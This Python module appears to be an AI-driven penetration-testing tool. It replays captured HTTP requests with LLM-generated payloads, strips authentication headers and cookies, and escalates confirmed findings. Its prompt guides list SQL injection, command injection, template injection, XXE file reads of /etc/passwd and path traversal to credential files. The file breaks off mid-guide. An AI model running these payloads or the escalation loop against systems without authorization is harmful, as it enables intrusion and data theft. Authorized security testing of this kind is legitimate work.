"""
VAPT Analyzer with Advanced Request Manipulation Support

This module provides adaptive vulnerability assessment and penetration testing capabilities
with support for dynamic request modifications. The VAPT agent can now intelligently
manipulate HTTP requests including:

- Removing authentication headers (Authorization, JWT tokens, API keys)
- Adding custom headers
- Removing/modifying cookies
- Testing authentication bypass scenarios
- Access control testing without credentials

Key Features:
1. AI-driven test generation with request modification support
2. Structured test objects that specify both payloads and request changes
3. Category-specific testing strategies (OWASP Top 10)
4. Adaptive iteration based on response analysis
5. Authentication and authorization bypass testing

Example Test Object:
{
    "payload": "admin_endpoint",
    "test_type": "authorization_bypass",
    "request_modifications": {
        "headers_to_remove": ["Authorization", "X-API-Key"],
        "cookies_to_remove": ["session"]
    }
}
"""

import requests
import openai
import re
import json
from urllib.parse import urlparse, parse_qs
import logging
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from typing import Any, Dict, List, Union

from .config import settings

log = logging.getLogger("rich")

try:
    client = openai.OpenAI(api_key=settings.CEREBRAS_API_KEY, base_url=settings.CEREBRAS_API_BASE)
    log.debug("Cerebras AI client initialized successfully.")
except Exception as e:
    log.error(f"Failed to initialize AI client: {e}")
    console = Console()
    console.print("[bold red]Could not connect to the AI service.[/bold red]")
    exit(1)

# ==================== ROBUST JSON HELPERS ====================

def _extract_json_from_ai_response(response_text: str) -> str:
    """
    Robustly extracts JSON from AI responses with multiple fallback strategies.
    """
    if not response_text:
        return "[]"
    
    # Strategy 1: Extract from markdown code blocks
    patterns = [
        r'```json\s*([\s\S]*?)\s*```',  # ```json ... ```
        r'```\s*([\s\S]*?)\s*```',       # ``` ... ```
        r'`([^`]+)`',                     # `...`
    ]
    
    for pattern in patterns:
        match = re.search(pattern, response_text)
        if match:
            extracted = match.group(1).strip()
            if extracted:
                # Try to validate it's JSON
                try:
                    json.loads(extracted)
                    return extracted
                except json.JSONDecodeError:
                    continue
    
    # Strategy 2: Look for JSON array/object patterns
    json_patterns = [
        r'\[\s*\{[\s\S]*\}\s*\]',  # Array of objects
        r'\{[\s\S]*\}',             # Single object
        r'\[[\s\S]*\]',             # Array
    ]
    
    for pattern in json_patterns:
        match = re.search(pattern, response_text)
        if match:
            try:
                candidate = match.group(0)
                json.loads(candidate)  # Validate
                return candidate
            except json.JSONDecodeError:
                continue
    
    # Strategy 3: Try parsing the entire response
    try:
        json.loads(response_text)
        return response_text.strip()
    except json.JSONDecodeError:
        pass
    
    # Strategy 4: Return safe default
    return response_text.strip()


def safe_json_parse(text: str, default: Any = None) -> Any:
    """
    Safely parse JSON with fallback to default value.
    """
    try:
        return json.loads(text)
    except (json.JSONDecodeError, TypeError, ValueError) as e:
        log.warning(f"JSON parse failed: {e}. Using default.")
        return default if default is not None else []


def sanitize_for_json(obj: Any) -> Any:
    """
    Recursively sanitize objects to be JSON-serializable.
    Handles common non-serializable types.
    """
    if obj is None:
        return None
    
    if isinstance(obj, (str, int, float, bool)):
        return obj
    
    if isinstance(obj, dict):
        return {k: sanitize_for_json(v) for k, v in obj.items()}
    
    if isinstance(obj, (list, tuple)):
        return [sanitize_for_json(item) for item in obj]
    
    if isinstance(obj, bytes):
        try:
            return obj.decode('utf-8')
        except UnicodeDecodeError:
            return obj.decode('utf-8', errors='ignore')
    
    # Handle objects with __dict__
    if hasattr(obj, '__dict__'):
        return sanitize_for_json(obj.__dict__)
    
    # Fallback: convert to string
    return str(obj)


def safe_json_dumps(obj: Any, indent: int = 2) -> str:
    """
    Safely serialize object to JSON string with error handling.
    """
    try:
        # First sanitize the object
        sanitized = sanitize_for_json(obj)
        return json.dumps(sanitized, indent=indent, ensure_ascii=False)
    except (TypeError, ValueError) as e:
        log.error(f"JSON serialization failed: {e}")
        # Return a safe error representation
        return json.dumps({
            "error": "JSON serialization failed",
            "message": str(e),
            "type": str(type(obj))
        }, indent=indent)


def clean_response_data(response: Dict) -> Dict:
    """
    Clean response data to ensure JSON serializability.
    Truncates large data and removes non-serializable objects.
    """
    if not response:
        return {
            "status_code": 0,
            "headers": {},
            "body": "",
            "time": 0
        }
    
    return {
        "status_code": response.get('status_code', 0),
        "headers": dict(list(response.get('headers', {}).items())[:10]),  # Limit headers
        "body": str(response.get('body', ''))[:2000],  # Truncate large bodies
        "time": float(response.get('time', 0))
    }

# ==================== EXISTING HELPER FUNCTIONS ====================

def _set_nested_json_value(data_dict: dict, path: str, value: any):
    """Sets a value in a nested dictionary/list based on a string path."""
    keys = path.split('.')
    current_level = data_dict
    
    for i in range(len(keys) - 1):
        key = keys[i]
        match = re.match(r'(.+)\[(\d+)\]', key)
        if match:
            prop, index_str = match.groups()
            index = int(index_str)
            if prop not in current_level or not isinstance(current_level[prop], list) or len(current_level[prop]) <= index:
                raise KeyError(f"Invalid path component: {key}")
            current_level = current_level[prop][index]
        else:
            if key not in current_level:
                raise KeyError(f"Invalid path component: {key}")
            current_level = current_level[key]
            
    last_key = keys[-1]
    match = re.match(r'(.+)\[(\d+)\]', last_key)
    if match:
        prop, index_str = match.groups()
        index = int(index_str)
        if prop not in current_level or not isinstance(current_level[prop], list) or len(current_level[prop]) <= index:
            raise KeyError(f"Invalid final path component: {last_key}")
        current_level[prop][index] = value
    else:
        if not isinstance(current_level, dict):
             raise KeyError(f"Cannot set key '{last_key}' on a list.")
        current_level[last_key] = value

class ParsedHttpRequest:
    def __init__(self, method, url, headers, data, cookies, verify):
        self.method = method
        self.url = url
        self.headers = headers
        self.data = data
        self.cookies = cookies
        self.verify = verify

def parse_raw_http_request(raw_request_string: str) -> ParsedHttpRequest:
    log.debug("Starting raw HTTP request parsing.")
    lines = raw_request_string.strip().split('\n')
    if not lines: raise ValueError("Empty request")
    request_line = lines[0].strip()
    match = re.match(r'([A-Z]+)\s+([^?\s]+)(\?.*)?\s+HTTP/\d\.\d', request_line)
    if not match: raise ValueError(f"Invalid request line: {request_line}")
    method, path, query = match.groups()
    path_with_query = path + (query or '')
    headers, body, header_section_finished = {}, "", False
    for line in lines[1:]:
        line = line.strip('\r')
        if not header_section_finished:
            if not line:
                header_section_finished = True; continue
            if ':' in line: key, value = line.split(':', 1); headers[key.strip()] = value.strip()
        else: body += line + '\n'
    body = body.strip()
    host = headers.get('Host')
    if not host: raise ValueError("Host header missing")
    scheme = "https" if ':443' in host or headers.get('X-Forwarded-Proto') == 'https' else "http"
    full_url = f"{scheme}://{host}{path_with_query}"
    cookies = {}
    if 'Cookie' in headers:
        cookie_header = headers.pop('Cookie')
        for pair in cookie_header.split(';'):
            if '=' in pair: k, v = pair.split('=', 1); cookies[k.strip()] = v.strip()
    return ParsedHttpRequest(method, full_url, headers, body, cookies, False)

def _traverse_json(obj, params_list, prefix=''):
    if isinstance(obj, dict):
        for key, value in obj.items():
            new_prefix = f"{prefix}.{key}" if prefix else key
            params_list.append(f"JSON Body: {new_prefix}")
            _traverse_json(value, params_list, new_prefix)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            new_prefix = f"{prefix}[{i}]"
            _traverse_json(item, params_list, new_prefix)

def find_request_parameters(request: ParsedHttpRequest) -> list[str]:
    params = []
    log.debug("Finding injectable parameters.")
    query_params = parse_qs(urlparse(request.url).query)
    for key in query_params: params.append(f"URL Query: {key}")
    content_type = request.headers.get("Content-Type", "")
    if request.data:
        if "application/json" in content_type:
            try: _traverse_json(json.loads(request.data), params)
            except json.JSONDecodeError: log.warning("Body is not valid JSON.")
        elif "application/x-www-form-urlencoded" in content_type:
            for key in parse_qs(request.data): params.append(f"Form Body: {key}")
    log.debug(f"Found parameters: {params}")
    return params

def _call_ai(prompt: str) -> str:
    log.debug(f"--- AI Prompt ---\n{prompt[:500]}...\n--- End of AI Prompt ---")
    try:
        chat_completion = client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model=settings.CEREBRAS_MODEL,
        )
        response = chat_completion.choices[0].message.content
        log.debug(f"--- AI Response ---\n{response[:500]}...\n--- End of AI Response ---")
        return response
    except openai.APIError as e:
        log.error(f"Error from Cerebras API: {e}", extra={"markup": True})
        return f"Error: Could not get a response from the AI. {e}"
    except Exception as e:
        log.error(f"An unexpected error occurred during AI call: {e}", extra={"markup": True})
        return f"Error: An unexpected error occurred. {e}"

def _send_request(
    request: ParsedHttpRequest, 
    proxy: str | None, 
    payload_location: str | None = None, 
    payload: str | None = None,
    request_modifications: dict | None = None
) -> dict | None:
    """
    Helper to send HTTP requests with optional payload injection and request modifications.
    
    Args:
        request: The parsed HTTP request
        proxy: Optional proxy URL
        payload_location: Where to inject the payload (e.g., "URL Query: param" or "JSON Body: path")
        payload: The payload value to inject
        request_modifications: Optional dict with:
            - headers_to_remove: list of header names to remove (e.g., ["Authorization", "X-API-Key"])
            - headers_to_add: dict of headers to add/update (e.g., {"X-Test": "value"})
            - cookies_to_remove: list of cookie names to remove
            - cookies_to_add: dict of cookies to add/update
    
    Returns:
        Response dict with status_code, headers, body, time or None on error
    """
    url = request.url
    data = request.data
    headers = request.headers.copy()
    cookies = request.cookies.copy() if request.cookies else {}

    # Apply payload injection
    if payload_location and payload:
        if "URL Query" in payload_location:
            param_name = payload_location.split(": ")[1]
            url = f"{url.split('?')[0]}?{param_name}={payload}"
        
        elif "JSON Body" in payload_location:
            path_to_modify = payload_location.split(": ", 1)[1]
            try:
                json_body = json.loads(request.data)
                _set_nested_json_value(json_body, path_to_modify, payload)
                data = json.dumps(json_body)
                headers.pop('Content-Length', None)
                headers.pop('content-length', None)
                log.debug(f"Injected payload. New JSON body: {data}")
            except (json.JSONDecodeError, KeyError, IndexError, TypeError) as e:
                log.error(f"Failed to inject payload into JSON for path '{path_to_modify}': {e}", extra={"markup": True})
                return None
    
    # Apply request modifications (for authentication testing, header manipulation, etc.)
    if request_modifications:
        # Remove headers (e.g., Authorization, JWT tokens)
        headers_to_remove = request_modifications.get('headers_to_remove', [])
        for header_name in headers_to_remove:
            # Case-insensitive header removal
            headers_copy = headers.copy()
            for key in headers_copy:
                if key.lower() == header_name.lower():
                    removed_value = headers.pop(key, None)
                    log.debug(f"Removed header: {key} (value: {removed_value[:50] if removed_value else 'None'}...)")
        
        # Add/update headers
        headers_to_add = request_modifications.get('headers_to_add', {})
        for header_name, header_value in headers_to_add.items():
            headers[header_name] = header_value
            log.debug(f"Added/Updated header: {header_name} = {header_value}")
        
        # Remove cookies
        cookies_to_remove = request_modifications.get('cookies_to_remove', [])
        for cookie_name in cookies_to_remove:
            if cookie_name in cookies:
                cookies.pop(cookie_name)
                log.debug(f"Removed cookie: {cookie_name}")
        
        # Add/update cookies
        cookies_to_add = request_modifications.get('cookies_to_add', {})
        for cookie_name, cookie_value in cookies_to_add.items():
            cookies[cookie_name] = cookie_value
            log.debug(f"Added/Updated cookie: {cookie_name} = {cookie_value}")
    
    proxies = None
    if proxy:
        proxies = {"http": proxy, "https": proxy}

    try:
        response = requests.request(
            method=request.method,
            url=url,
            headers=headers,
            data=data,
            cookies=cookies,
            verify=False,
            timeout=15,
            proxies=proxies
        )
        return {
            "status_code": response.status_code, 
            "headers": dict(response.headers), 
            "body": response.text,
            "time": response.elapsed.total_seconds()
        }
    except requests.exceptions.ProxyError as e:
        log.error(f"Proxy Error: Could not connect to proxy", extra={"markup": True})
        return None
    except requests.RequestException as e:
        log.error(f"HTTP request failed: {e}", extra={"markup": True})
        return None

# ==================== ADAPTIVE ITERATIVE ENGINE (FIXED) ====================

def _adaptive_payload_iteration(
    parsed_request: ParsedHttpRequest,
    proxy: str | None,
    param_to_test: str,
    baseline_response: dict,
    category: str,
    max_iterations: int = 5
) -> list[dict]:
    """
    UNIVERSAL: Adaptive payload generation for ANY OWASP Top 10 vulnerability category.
    Generates next payload based on IMMEDIATE analysis of previous payload's response.
    Works for: Injection, Access Control, Auth, SSRF, XXE, Deserialization, etc.
    """
    console = Console()
    
    successful_payloads = []
    accumulated_intelligence = {
        "technologies_detected": [],
        "error_patterns": [],
        "working_attack_vectors": [],
        "response_behaviors": [],
        "security_indicators": []
    }
    
    # Category-specific testing strategies
    category_strategies = {
        "Injection": {
            "initial_vectors": ["SQL Injection", "Command Injection", "SSTI", "SpEL", "NoSQL", "LDAP", "XPath", "XXE"],
            "detection_methods": ["error-based", "boolean-based", "time-based", "blind"],
            "success_indicators": ["error messages", "logic changes", "time delays", "expression evaluation"]
        },
        "Broken Access Control": {
            "initial_vectors": ["IDOR", "Path Traversal", "Privilege Escalation", "Forced Browsing", "Missing Authorization"],
            "detection_methods": ["parameter manipulation", "horizontal escalation", "vertical escalation", "direct object reference"],
            "success_indicators": ["unauthorized data access", "status code changes", "different user data", "admin functions exposed"]
        },
        "Authentication Failures": {
            "initial_vectors": ["Weak Passwords", "Session Fixation", "Credential Stuffing", "Missing MFA", "Predictable Session IDs"],
            "detection_methods": ["session manipulation", "token analysis", "brute force susceptibility", "session hijacking"],
            "success_indicators": ["session accepted", "authentication bypassed", "predictable tokens", "no rate limiting"]
        },
        "Cryptographic Failures": {
            "initial_vectors": ["Weak Encryption", "Insecure Transmission", "Hardcoded Keys", "Weak Hashing", "ECB Mode"],
            "detection_methods": ["protocol analysis", "cipher detection", "plaintext exposure", "weak algorithm detection"],
            "success_indicators": ["plaintext data", "weak ciphers", "exposed keys", "MD5/SHA1 usage", "no TLS"]
        },
        "Security Misconfiguration": {
            "initial_vectors": ["Default Credentials", "Directory Listing", "Verbose Errors", "Unnecessary Features", "Missing Headers"],
            "detection_methods": ["header analysis", "error verbosity", "service enumeration", "default config detection"],
            "success_indicators": ["stack traces", "version disclosure", "admin panels", "debug mode", "default pages"]
        },
        "Vulnerable Components": {
            "initial_vectors": ["Outdated Libraries", "Known CVEs", "Unpatched Software", "EOL Components"],
            "detection_methods": ["version detection", "CVE exploitation", "library fingerprinting", "dependency analysis"],
            "success_indicators": ["version headers", "library errors", "known exploit success", "vulnerable patterns"]
        },
        "SSRF": {
            "initial_vectors": ["Internal URL Access", "Cloud Metadata", "Port Scanning", "Protocol Smuggling", "DNS Rebinding"],
            "detection_methods": ["URL manipulation", "localhost access", "internal IP ranges", "cloud endpoints"],
            "success_indicators": ["internal responses", "metadata exposed", "port responses", "DNS queries", "timeout patterns"]
        },
        "Insecure Deserialization": {
            "initial_vectors": ["Java Deserialization", "Python Pickle", "PHP Object Injection", ".NET Deserialization"],
            "detection_methods": ["serialized object injection", "gadget chain exploitation", "magic byte detection"],
            "success_indicators": ["deserialization errors", "object injection", "RCE through gadgets", "type confusion"]
        },
        "XXE": {
            "initial_vectors": ["External Entity", "Billion Laughs", "SSRF via XXE", "File Disclosure"],
            "detection_methods": ["XML injection", "entity expansion", "OOB data exfiltration"],
            "success_indicators": ["file contents", "internal requests", "entity expansion", "parser errors"]
        },
        "Security Logging Failures": {
            "initial_vectors": ["Missing Logs", "Log Injection", "Insufficient Monitoring", "No Alerting"],
            "detection_methods": ["log analysis", "monitoring detection", "SIEM integration check"],
            "success_indicators": ["no logging", "log manipulation", "undetected attacks", "missing audit trail"]
        }
    }
    
    # Get strategy for current category or use generic
    strategy = category_strategies.get(category, {
        "initial_vectors": ["Generic testing"],
        "detection_methods": ["behavioral analysis"],
        "success_indicators": ["anomalous responses"]
    })
    
    # Initial context
    initial_context = f"""You are an expert VAPT penetration tester specializing in {category} vulnerabilities.

TARGET APPLICATION:
- Request: {parsed_request.method} {parsed_request.url}
- Headers: {safe_json_dumps(dict(list(parsed_request.headers.items())[:5]))}
- Body: {parsed_request.data[:500] if parsed_request.data else '[No Body]'}

BASELINE RESPONSE:
- Status: {baseline_response['status_code']}
- Body Length: {len(baseline_response.get('body', ''))} chars
- Key Headers: {safe_json_dumps(dict(list(baseline_response['headers'].items())[:3]))}
- Body Preview: {baseline_response['body'][:500]}

VULNERABILITY CATEGORY: {category}
ATTACK VECTORS FOR THIS CATEGORY: {', '.join(strategy['initial_vectors'])}
DETECTION METHODS: {', '.join(strategy['detection_methods'])}
SUCCESS INDICATORS: {', '.join(strategy['success_indicators'])}

Your mission: Detect and exploit {category} vulnerabilities through ADAPTIVE, INTELLIGENT testing."""

    for iteration in range(1, max_iterations + 1):
        console.rule(f"[bold cyan]🔄 Iteration {iteration}/{max_iterations} - {category} Testing[/bold cyan]")
        
        # ===== STEP 1: GENERATE CATEGORY-SPECIFIC PAYLOADS =====
        if iteration == 1:
            generation_prompt = f"""{initial_context}

TASK: Generate 3-5 DIVERSE initial detection payloads/tests for {category}.

=== CATEGORY-SPECIFIC TESTING GUIDELINES ===

{_get_category_testing_guide(category)}

Return ONLY a JSON array with structured test objects:
[
  {{
    "payload": "...",
    "test_type": "...",
    "expected_indicator": "what indicates success",
    "request_modifications": {{
      "headers_to_remove": ["Authorization", "X-API-Key"],  // Optional: headers to remove for auth bypass tests
      "headers_to_add": {{"X-Custom": "value"}},  // Optional: headers to add
      "cookies_to_remove": ["session"],  // Optional: cookies to remove
      "cookies_to_add": {{"test": "value"}}  // Optional: cookies to add
    }}
  }}
]

**IMPORTANT FOR AUTHENTICATION TESTING:**
- To test authentication bypass, include "headers_to_remove": ["Authorization"] or ["Bearer"]
- To test without JWT, remove the Authorization header
- To test session handling, manipulate cookies
- For broken access control, try removing auth headers while accessing protected resources

CRITICAL: Adapt payloads AND request modifications to the specific vulnerability category! Don't just use injection payloads for all categories."""

        else:
            # Subsequent iterations: hyper-targeted based on learned intelligence
            generation_prompt = f"""{initial_context}

=== INTELLIGENCE GATHERED SO FAR ===

Technologies Detected:
{json.dumps(accumulated_intelligence['technologies_detected'], indent=2)}

Security Indicators Found:
{json.dumps(accumulated_intelligence['security_indicators'], indent=2)}

Working Attack Vectors:
{json.dumps(accumulated_intelligence['working_attack_vectors'], indent=2)}

Response Behaviors:
{json.dumps(accumulated_intelligence['response_behaviors'], indent=2)}

Error Patterns:
{json.dumps(accumulated_intelligence['error_patterns'][:3], indent=2)}

=== YOUR TASK FOR ITERATION {iteration} ===

Based on the intelligence above, generate 3-5 HIGHLY TARGETED payloads/tests for {category}.

{_get_adaptive_guidance(category, accumulated_intelligence)}

Return ONLY JSON array with structured test objects:
[
  {{
    "payload": "...",
    "reasoning": "why this based on findings",
    "expected_behavior": "what confirms vulnerability",
    "request_modifications": {{
      "headers_to_remove": ["Authorization"],  // Optional: for auth bypass
      "headers_to_add": {{"X-Custom": "value"}},  // Optional
      "cookies_to_remove": ["session"],  // Optional
      "cookies_to_add": {{"test": "value"}}  // Optional
    }}
  }}
]

**For Authentication/Access Control tests, remember to manipulate headers/cookies as needed!**"""

        # Get payload suggestions
        ai_response = _call_ai(generation_prompt)
        cleaned_response = _extract_json_from_ai_response(ai_response)
        payload_batch = safe_json_parse(cleaned_response, default=[])
        
        if not isinstance(payload_batch, list):
            payload_batch = [payload_batch] if isinstance(payload_batch, dict) else []
        
        if not payload_batch:
            log.warning(f"No payloads generated for iteration {iteration}")
            continue
        
        log.info(f"[cyan]Generated {len(payload_batch)} adaptive payloads for {category}[/cyan]")
        
        # ===== STEP 2: TEST EACH PAYLOAD AND IMMEDIATELY ANALYZE =====
        for payload_idx, payload_obj in enumerate(payload_batch, 1):
            try:
                payload = payload_obj.get('payload', payload_obj) if isinstance(payload_obj, dict) else str(payload_obj)
                test_type = payload_obj.get('test_type', payload_obj.get('reasoning', 'unknown'))
                
                # Extract request modifications if present
                request_modifications = None
                if isinstance(payload_obj, dict) and 'request_modifications' in payload_obj:
                    request_modifications = payload_obj.get('request_modifications')
                    log.info(f"\n[bold white]  Testing Payload {payload_idx}/{len(payload_batch)} with Request Modifications:[/bold white]")
                    log.info(f"  [yellow]Test:[/yellow] {payload[:80]}...")
                    log.info(f"  [yellow]Type:[/yellow] {test_type}")
                    log.info(f"  [cyan]Modifications:[/cyan] {safe_json_dumps(request_modifications)}")
                else:
                    log.info(f"\n[bold white]  Testing Payload {payload_idx}/{len(payload_batch)}:[/bold white]")
                    log.info(f"  [yellow]Test:[/yellow] {payload[:80]}...")
                    log.info(f"  [yellow]Type:[/yellow] {test_type}")
                
                # Send request with modifications
                response = _send_request(parsed_request, proxy, param_to_test, payload, request_modifications)
                if not response:
                    log.warning(f"  [red]✗ Request failed[/red]")
                    continue
                
                # ===== STEP 3: CATEGORY-AWARE DEEP ANALYSIS =====
                analysis_prompt = f"""CRITICAL: Perform DEEP ANALYSIS specific to {category} vulnerability.

=== TEST DETAILS ===
Payload/Test: {payload}
Test Type: {test_type}
Category: {category}
Iteration: {iteration}/{max_iterations}

=== BASELINE VS CURRENT RESPONSE ===

BASELINE:
- Status: {baseline_response['status_code']}
- Length: {len(baseline_response.get('body', ''))}
- Headers: {json.dumps(dict(list(baseline_response.get('headers', {}).items())[:3]), indent=2)}
- Body Preview: {baseline_response['body'][:600]}

CURRENT RESPONSE:
- Status: {response['status_code']}
- Length: {len(response.get('body', ''))}
- Time: {response.get('time', 0)}s
- Headers: {json.dumps(dict(list(response.get('headers', {}).items())[:5]), indent=2)}
- Body: {response['body'][:1500]}

=== CATEGORY-SPECIFIC ANALYSIS FRAMEWORK ===

{_get_analysis_framework(category)}

=== REQUIRED OUTPUT FORMAT ===

VERDICT: [VULNERABLE / POTENTIALLY_VULNERABLE / NOT_VULNERABLE / NEEDS_MORE_TESTING]

CONFIDENCE: [0-100]%

CATEGORY: {category}

TECHNOLOGY_DETECTED:
- Framework: [If applicable]
- Language: [If detected]
- Server: [If detected]
- Other: [Any other tech indicators]

VULNERABILITY_INDICATORS:
[List specific evidence for THIS category]

SECURITY_MISCONFIGURATIONS:
[Any security issues observed]

ATTACK_VECTOR_WORKING: [Describe what's working]

KEY_EVIDENCE:
- [Response differences]
- [Error messages]
- [Behavioral changes]
- [Security bypasses]

EXPLOITATION_PATH:
[If vulnerable, how to escalate for THIS specific category?]

NEXT_RECOMMENDED_TESTS:
1. [Specific test] - [Why based on this response]
2. [Specific test] - [Reasoning]
3. [Specific test] - [Reasoning]

STOP_TESTING: [YES/NO - sufficient confirmation?]"""

                analysis = _call_ai(analysis_prompt)
                
                log.info(f"\n[bold magenta]  📊 Analysis Results:[/bold magenta]")
                
                # ===== STEP 4: PARSE ANALYSIS AND UPDATE INTELLIGENCE =====
                verdict_match = re.search(r'VERDICT:\s*(\w+)', analysis, re.IGNORECASE)
                verdict = verdict_match.group(1).upper() if verdict_match else "UNKNOWN"
                
                confidence_match = re.search(r'CONFIDENCE:\s*(\d+)', analysis)
                confidence = int(confidence_match.group(1)) if confidence_match else 0
                
                # Extract technologies
                tech_section = re.search(r'TECHNOLOGY_DETECTED:(.*?)(?=VULNERABILITY_INDICATORS|$)', analysis, re.DOTALL | re.IGNORECASE)
                if tech_section:
                    tech_text = tech_section.group(1)
                    for line in tech_text.split('\n'):
                        if line.strip() and ':' in line:
                            tech_info = line.strip()
                            if tech_info not in accumulated_intelligence['technologies_detected']:
                                accumulated_intelligence['technologies_detected'].append(tech_info)
                                log.info(f"  [bold green]🎯 Technology:[/bold green] {tech_info}")
                
                # Extract vulnerability indicators
                vuln_section = re.search(r'VULNERABILITY_INDICATORS:(.*?)(?=SECURITY_MISCONFIGURATIONS|ATTACK_VECTOR|$)', analysis, re.DOTALL | re.IGNORECASE)
                if vuln_section:
                    vuln_text = vuln_section.group(1).strip()
                    if vuln_text and len(vuln_text) > 10:
                        accumulated_intelligence['security_indicators'].append(vuln_text[:300])
                
                # Extract working attack vector
                vector_match = re.search(r'ATTACK_VECTOR_WORKING:\s*([^\n]+)', analysis, re.IGNORECASE)
                if vector_match:
                    vector = vector_match.group(1).strip()
                    if "none" not in vector.lower() and vector not in accumulated_intelligence['working_attack_vectors']:
                        accumulated_intelligence['working_attack_vectors'].append(vector)
                        log.info(f"  [bold green]✓ Working Vector:[/bold green] {vector}")
                
                # Extract response behaviors
                behavior_section = re.search(r'KEY_EVIDENCE:(.*?)(?=EXPLOITATION_PATH|NEXT_RECOMMENDED|$)', analysis, re.DOTALL | re.IGNORECASE)
                if behavior_section:
                    behavior_text = behavior_section.group(1).strip()
                    if behavior_text and len(behavior_text) > 10:
                        accumulated_intelligence['response_behaviors'].append(behavior_text[:300])
                
                # Log verdict
                if verdict == "VULNERABLE":
                    log.info(f"  [bold green]✓✓✓ VULNERABLE (Confidence: {confidence}%)[/bold green]")
                elif verdict == "POTENTIALLY_VULNERABLE":
                    log.info(f"  [bold yellow]⚠ POTENTIALLY VULNERABLE (Confidence: {confidence}%)[/bold yellow]")
                else:
                    log.info(f"  [dim]✗ {verdict} (Confidence: {confidence}%)[/dim]")
                
                # Store result
                result = {
                    "payload": str(payload),
                    "test_type": str(test_type),
                    "category": category,
                    "verdict": verdict,
                    "confidence": confidence,
                    "response": clean_response_data(response),
                    "analysis": str(analysis),
                    "iteration": iteration
                }
                
                # If vulnerable or potentially vulnerable, add to successful list
                if verdict in ["VULNERABLE", "POTENTIALLY_VULNERABLE"] and confidence >= 60:
                    successful_payloads.append(result)
                    log.info(f"  [bold green]Added to successful findings (Total: {len(successful_payloads)})[/bold green]")
                
                # ===== STEP 5: GENERATE IMMEDIATE FOLLOW-UP IF HIGH CONFIDENCE =====
                if verdict == "VULNERABLE" and confidence >= 80:
                    log.info(f"\n[bold green]  🚀 HIGH CONFIDENCE! Generating immediate escalation tests...[/bold green]")
                    
                    # Include info about what modifications were used if any
                    modifications_used = ""
                    if request_modifications:
                        modifications_used = f"\nREQUEST MODIFICATIONS USED: {safe_json_dumps(request_modifications)}"
                    
                    immediate_followup_prompt = f"""CONFIRMED {category} vulnerability! Generate 2-3 IMMEDIATE escalation tests.

SUCCESSFUL TEST: {payload}{modifications_used}
ANALYSIS: {analysis[:1000]}

Generate tests that:
1. Escalate this confirmed vulnerability
2. Extract meaningful proof safely
3. Use the SAME attack vector that worked
4. Are specific to {category} category
5. If auth bypass was successful, continue testing without authentication

Return ONLY JSON array:
[
  {{
    "payload": "...",
    "purpose": "what it will demonstrate/extract",
    "request_modifications": {{
      "headers_to_remove": ["Authorization"],  // If previous test removed auth
      "headers_to_add": {{"X-Custom": "value"}},  // Optional
      "cookies_to_remove": ["session"],  // Optional
      "cookies_to_add": {{"test": "value"}}  // Optional
    }}
  }}
]"""
                    
                    immediate_response = _call_ai(immediate_followup_prompt)
                    immediate_cleaned = _extract_json_from_ai_response(immediate_response)
                    immediate_payloads = safe_json_parse(immediate_cleaned, default=[])
                    
                    if isinstance(immediate_payloads, list) and immediate_payloads:
                        log.info(f"  [cyan]Generated {len(immediate_payloads)} immediate follow-up tests[/cyan]")
                        payload_batch = payload_batch[:payload_idx] + immediate_payloads + payload_batch[payload_idx:]
                
                # Check if AI recommends stopping
                stop_match = re.search(r'STOP_TESTING:\s*(YES|NO)', analysis, re.IGNORECASE)
                if stop_match and stop_match.group(1).upper() == "YES" and len(successful_payloads) >= 3:
                    log.info(f"\n[bold green]✓ Sufficient confirmation for {category} ({len(successful_payloads)} successful findings)[/bold green]")
                    return successful_payloads
                
            except Exception as e:
                log.error(f"  [red]Error processing test {payload_idx}: {e}[/red]")
                continue
        
        # ===== ITERATION SUMMARY =====
        console.print(f"\n[bold cyan]Iteration {iteration} Summary:[/bold cyan]")
        console.print(f"  • Technologies Detected: {len(set(accumulated_intelligence['technologies_detected']))}")
        console.print(f"  • Working Attack Vectors: {len(set(accumulated_intelligence['working_attack_vectors']))}")
        console.print(f"  • Security Indicators: {len(accumulated_intelligence['security_indicators'])}")
        console.print(f"  • Total Successful Findings: {len(successful_payloads)}")
        
        # Check if we have strong confirmation
        if len(successful_payloads) >= 3:
            high_confidence_count = sum(1 for p in successful_payloads if p.get('confidence', 0) >= 80)
            if high_confidence_count >= 2:
                log.info(f"\n[bold green]✓✓✓ STRONG CONFIRMATION for {category}: {high_confidence_count} high-confidence findings.[/bold green]")
                break
    
    return successful_payloads

def _get_category_testing_guide(category: str) -> str:
    """Returns category-specific testing guidelines."""
    
    guides = {
        "Injection": """
**SQL INJECTION:**
- Error-based: ' OR 1=1--, '; SELECT @@version--
- Boolean: ' AND '1'='1 vs ' AND '1'='2
- Time-based: '; WAITFOR DELAY '0:0:5'--
- Union: ' UNION SELECT NULL,NULL--

**COMMAND INJECTION:**
- Basic: ; whoami, | id, && hostname
- Blind: ; sleep 5, `ping -c 5 127.0.0.1`

**SSTI (Server-Side Template Injection):**
- {{7*7}}, ${7*7}, #{7*7}
- {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}

**SPEL (Spring Expression Language):**
- #{7*7}, T(java.lang.System).getProperty('os.name')

**NoSQL:**
- {'$ne': null}, {'$gt': ''}

**LDAP:**
- *)(uid=*))(&(uid=*

**XXE:**
- <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
""",
        
        "Broken Access Control": """
**IDOR (Insecure Direct Object Reference):**
- Change user IDs in parameters: ?user_id=123 → ?user_id=124
- Modify resource IDs: /api/invoice/100 → /api/invoice/101
- Test with different user contexts
- Try accessing other users' data without authentication (remove Authorization header)

**PATH TRAVERSAL:**
- ../../../etc/passwd
- ..\\..\\..\\windows\\system32\\config\\sam
- ....//....//....//etc/passwd

**PRIVILEGE ESCALATION:**
- Change role parameters: role=user → role=admin
- Add admin flags: &isAdmin=true
- Modify authorization headers
- Remove authentication entirely and test admin functions

**FORCED BROWSING:**
- /admin, /admin.php, /administrator
- /api/internal, /api/admin
- Hidden endpoints from client-side code
- Test these endpoints WITHOUT authentication headers

**MISSING FUNCTION LEVEL ACCESS CONTROL:**
- Access admin functions without auth (use request_modifications.headers_to_remove: ["Authorization"])
- PUT/DELETE on resources that should be read-only
- Test privileged operations without JWT/session tokens

**CRITICAL FOR ACCESS CONTROL TESTING:**
Test protected resources WITHOUT authentication:
{
  "request_modifications": {
    "headers_to_remove": ["Authorization"],
    "cookies_to_remove": ["session", "token"]
  }
}
""",
        
        "Authentication Failures": """
**WEAK CREDENTIALS:**
- Test common passwords: admin/admin, root/root
